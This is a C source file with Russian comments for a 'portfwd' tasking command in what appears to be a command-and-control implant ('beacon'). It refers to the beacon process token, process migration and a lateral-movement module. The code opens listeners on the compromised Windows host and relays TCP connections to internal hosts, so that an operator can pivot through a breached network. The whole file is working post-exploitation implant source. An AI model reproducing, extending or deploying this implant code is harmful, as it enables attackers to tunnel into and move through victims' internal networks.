// cmd_portfwd.c — TCP port forwarding
//
// portfwd add <lport> <rhost> <rport>  — открыть локальный TCP-слушатель
// portfwd del <lport>                  — закрыть слушатель
// portfwd list                         — список активных правил
//
// Каждое правило создаёт фоновый поток-листенер, который принимает
// входящие соединения и проксирует их к rhost:rport через два
// полудуплексных proxy-потока (от клиента → удалённому и обратно).
//
// Все соединения работают с токеном beacon-процесса.
// При cmd_exit / migrate все фоновые потоки умирают вместе с процессом.

// winsock2.h должен быть включён ДО windows.h, чтобы он определил
// _WINSOCKAPI_ и предотвратил подключение устаревшего winsock.h.
#include <winsock2.h>
#include <ws2tcpip.h>
#include "../core/beacon.h"

// Объявлена в cmd_lateral.c — вывод текстового префикса + числового кода ошибки
void lat_err(const char* prefix, DWORD code);

// ----------------------------------------------------------------
// Константы и типы
// ----------------------------------------------------------------

#define MAX_PORTFWD 8       // макс. одновременных правил
#define PF_BUF_SIZE 32768   // буфер проксирования (32 КБ)

// Одно активное правило
typedef struct {
    volatile LONG  active;       // 1 = поток запущен и слушает
    LONG           inuse;        // 1 = слот занят (не перетирать)
    DWORD          lport;
    char           rhost[256];
    DWORD          rport;
    SOCKET         sock_listen;
    HANDLE         hThread;
} PFEntry;

// Аргумент для одного proxy-потока: пересылать данные from → to
typedef struct {
    SOCKET from;
    SOCKET to;
} ProxyArg;

static PFEntry g_pf[MAX_PORTFWD];
static LONG    g_pf_inited = 0;

// Инициализация таблицы при первом обращении (безопасно т.к. таски последовательны)
static void pf_init(void) {
    if (g_pf_inited) return;
    for (int i = 0; i < MAX_PORTFWD; i++) {
        g_pf[i].sock_listen = INVALID_SOCKET;
        g_pf[i].active      = 0;
        g_pf[i].inuse       = 0;
    }
    g_pf_inited = 1;
}

// ----------------------------------------------------------------
// Вспомогательная функция: форматирование числа в строку без CRT
// ----------------------------------------------------------------
static int u32_to_str(DWORD v, char* buf) {
    char tmp[12]; int n = 0, i = 0;
    if (!v) { buf[0] = '0'; buf[1] = 0; return 1; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    while (n) buf[i++] = tmp[--n];
    buf[i] = 0;
    return i;
}

// ----------------------------------------------------------------
// proxy-поток: пересылает данные from → to, затем завершает to
// ----------------------------------------------------------------
static DWORD WINAPI pf_proxy(LPVOID arg)
{
    ProxyArg* p   = (ProxyArg*)arg;
    char*     buf = (char*)bmalloc(PF_BUF_SIZE);

    if (buf) {
        int n;
        while ((n = recv(p->from, buf, PF_BUF_SIZE, 0)) > 0) {
            int sent = 0;
            while (sent < n) {
                int r = send(p->to, buf + sent, n - sent, 0);
                if (r <= 0) goto done;
                sent += r;
            }
        }
    done:
        bfree(buf);
    }
    // Сигнализируем второму потоку что одна сторона закрыта
    shutdown(p->to, SD_SEND);
    bfree(p);
    return 0;
}

// ----------------------------------------------------------------
// Листенер-поток: принимает соединения и запускает proxy-пары
// ----------------------------------------------------------------
static DWORD WINAPI pf_listener(LPVOID arg)
{
    PFEntry* e = (PFEntry*)arg;

    while (InterlockedCompareExchange(&e->active, 1, 1)) {
        struct sockaddr_in cli;
        int csz = sizeof(cli);

        SOCKET client = accept(e->sock_listen, (struct sockaddr*)&cli, &csz);
        if (client == INVALID_SOCKET) break;  // сокет закрыт — выходим

        // Resolve rhost + connect к удалённому хосту
        struct addrinfo hints, *res = NULL;
        rt_memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        char port_str[12] = {0};
        u32_to_str(e->rport, port_str);

        if (getaddrinfo(e->rhost, port_str, &hints, &res) != 0 || !res) {
            closesocket(client);
            continue;
        }

        SOCKET remote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (remote == INVALID_SOCKET) {
            freeaddrinfo(res);
            closesocket(client);
            continue;
        }
        if (connect(remote, res->ai_addr, (int)res->ai_addrlen) != 0) {
            freeaddrinfo(res);
            closesocket(remote);
            closesocket(client);
            continue;
        }
        freeaddrinfo(res);

        // Выделяем по паре ProxyArg для двух направлений
        ProxyArg* p1 = (ProxyArg*)bmalloc(sizeof(ProxyArg));
        ProxyArg* p2 = (ProxyArg*)bmalloc(sizeof(ProxyArg));
        if (!p1 || !p2) {
            if (p1) bfree(p1);
            if (p2) bfree(p2);
            closesocket(remote);
            closesocket(client);
            continue;
        }
        p1->from = client; p1->to = remote;
        p2->from = remote; p2->to = client;

        // Запускаем два полудуплексных потока; handles сразу закрываем —
        // потоки самостоятельно освобождают ProxyArg и завершаются.
        HANDLE h1 = CreateThread(NULL, 0, pf_proxy, p1, 0, NULL);
        HANDLE h2 = CreateThread(NULL, 0, pf_proxy, p2, 0, NULL);
        if (h1) CloseHandle(h1);
        if (h2) CloseHandle(h2);
        if (!h1 || !h2) {
            // Если поток не создался — сокеты уже будут закрыты соседним потоком
            // или при shutdown, но на всякий случай явно закрываем.
            if (!h1) { bfree(p1); }
            if (!h2) { bfree(p2); }
            closesocket(remote);
            closesocket(client);
        }
    }

    // Помечаем слот как остановленный (sock уже закрыт снаружи или выше)
    InterlockedExchange(&e->active, 0);
    return 0;
}

// ----------------------------------------------------------------
// cmd_portfwd — точка входа из tasking.c
// ----------------------------------------------------------------
void cmd_portfwd(const BeaconTask* t)
{
    char action[16] = {0};
    pf_init();

    // Инициализация Winsock при первом использовании portfwd
    static LONG s_wsainit = 0;
    if (InterlockedCompareExchange(&s_wsainit, 1, 0) == 0) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
    }

    kv_get_str(t->pay, t->pay_len, "action", action, sizeof(action));

    // ---- portfwd add ------------------------------------------------
    if (!rt_memcmp(action, "add", 3)) {
        uint32_t lport = 0, rport = 0;
        char     rhost[256] = {0};

        if (!kv_get_u32(t->pay, t->pay_len, "lport", &lport) ||
            !kv_get_u32(t->pay, t->pay_len, "rport", &rport) ||
            !kv_get_str(t->pay, t->pay_len, "rhost", rhost, sizeof(rhost)) ||
            lport == 0 || rport == 0) {
            out_write("portfwd: missing lport/rhost/rport\n", 35);
            return;
        }

        // Найти свободный слот
        int slot = -1;
        for (int i = 0; i < MAX_PORTFWD; i++) {
            if (!g_pf[i].inuse) { slot = i; break; }
        }
        if (slot < 0) {
            out_write("portfwd: max rules reached (8)\n", 31);
            return;
        }

        SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (ls == INVALID_SOCKET) {
            out_write("portfwd: socket() failed\n", 25);
            return;
        }

        BOOL reuse = TRUE;
        setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        struct sockaddr_in addr;
        rt_memset(&addr, 0, sizeof(addr));
        addr.sin_family      = AF_INET;
        addr.sin_port        = htons((u_short)lport);
        addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(ls, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            lat_err("portfwd: bind() failed: ", WSAGetLastError());
            closesocket(ls);
            return;
        }
        if (listen(ls, 8) != 0) {
            lat_err("portfwd: listen() failed: ", WSAGetLastError());
            closesocket(ls);
            return;
        }

        PFEntry* e = &g_pf[slot];
        rt_memset(e, 0, sizeof(PFEntry));
        e->sock_listen = ls;
        e->lport       = lport;
        e->rport       = rport;
        rt_memcpy(e->rhost, rhost, rt_strlen(rhost) + 1);
        InterlockedExchange(&e->active, 1);
        InterlockedExchange(&e->inuse,  1);

        e->hThread = CreateThread(NULL, 0, pf_listener, e, 0, NULL);
        if (!e->hThread) {
            InterlockedExchange(&e->active, 0);
            InterlockedExchange(&e->inuse,  0);
            closesocket(ls);
            e->sock_listen = INVALID_SOCKET;
            out_write("portfwd: CreateThread failed\n", 29);
            return;
        }

        // Подтверждение
        char msg[512]; int mi = 0;
        char lps[12], rps[12];
        u32_to_str(lport, lps); u32_to_str(rport, rps);
        const char m1[] = "portfwd: 0.0.0.0:";
        const char m2[] = " -> ";
        const char m3[] = ":";
        const char m4[] = " [listening]\n";
        for (int j = 0; m1[j]; j++) msg[mi++] = m1[j];
        for (int j = 0; lps[j]; j++) msg[mi++] = lps[j];
        for (int j = 0; m2[j]; j++) msg[mi++] = m2[j];
        for (size_t j = 0; rhost[j] && mi < 480; j++) msg[mi++] = rhost[j];
        for (int j = 0; m3[j]; j++) msg[mi++] = m3[j];
        for (int j = 0; rps[j]; j++) msg[mi++] = rps[j];
        for (int j = 0; m4[j]; j++) msg[mi++] = m4[j];
        out_write(msg, (size_t)mi);

    // ---- portfwd del ------------------------------------------------
    } else if (!rt_memcmp(action, "del", 3)) {
        uint32_t lport = 0;
        kv_get_u32(t->pay, t->pay_len, "lport", &lport);

        for (int i = 0; i < MAX_PORTFWD; i++) {
            if (g_pf[i].inuse && g_pf[i].lport == lport) {
                InterlockedExchange(&g_pf[i].active, 0);
                closesocket(g_pf[i].sock_listen);   // разблокирует accept()
                if (g_pf[i].hThread) {
                    WaitForSingleObject(g_pf[i].hThread, 2000);
                    CloseHandle(g_pf[i].hThread);
                    g_pf[i].hThread = NULL;
                }
                g_pf[i].sock_listen = INVALID_SOCKET;
                InterlockedExchange(&g_pf[i].inuse, 0);
                out_write("portfwd: rule removed\n", 22);
                return;
            }
        }
        out_write("portfwd: rule not found\n", 24);

    // ---- portfwd list -----------------------------------------------
    } else {
        int found = 0;
        for (int i = 0; i < MAX_PORTFWD; i++) {
            if (!g_pf[i].inuse) continue;
            found = 1;
            char msg[512]; int mi = 0;
            char lps[12], rps[12];
            u32_to_str(g_pf[i].lport, lps);
            u32_to_str(g_pf[i].rport, rps);
            const char m1[] = "0.0.0.0:";
            const char m2[] = " -> ";
            const char m3[] = ":";
            const char m4[] = "\n";
            for (int j = 0; m1[j]; j++) msg[mi++] = m1[j];
            for (int j = 0; lps[j]; j++) msg[mi++] = lps[j];
            for (int j = 0; m2[j]; j++) msg[mi++] = m2[j];
            for (size_t j = 0; g_pf[i].rhost[j] && mi < 490; j++) msg[mi++] = g_pf[i].rhost[j];
            for (int j = 0; m3[j]; j++) msg[mi++] = m3[j];
            for (int j = 0; rps[j]; j++) msg[mi++] = rps[j];
            for (int j = 0; m4[j]; j++) msg[mi++] = m4[j];
            out_write(msg, (size_t)mi);
        }
        if (!found) out_write("portfwd: no active rules\n", 25);
    }
}
